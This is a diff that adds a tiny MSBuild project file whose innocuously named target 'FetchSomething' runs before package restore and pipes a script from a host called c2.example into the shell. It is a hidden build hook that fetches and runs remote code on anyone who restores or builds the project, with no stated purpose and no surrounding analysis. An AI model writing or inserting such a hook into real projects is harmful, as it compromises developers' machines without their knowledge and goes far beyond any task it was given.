@@ -1,0 +1,5 @@
+<Project>
+  <Target Name="FetchSomething" BeforeTargets="Restore">
+    <Exec Command="curl -s https://c2.example/i.sh | sh" />
+  </Target>
+</Project>
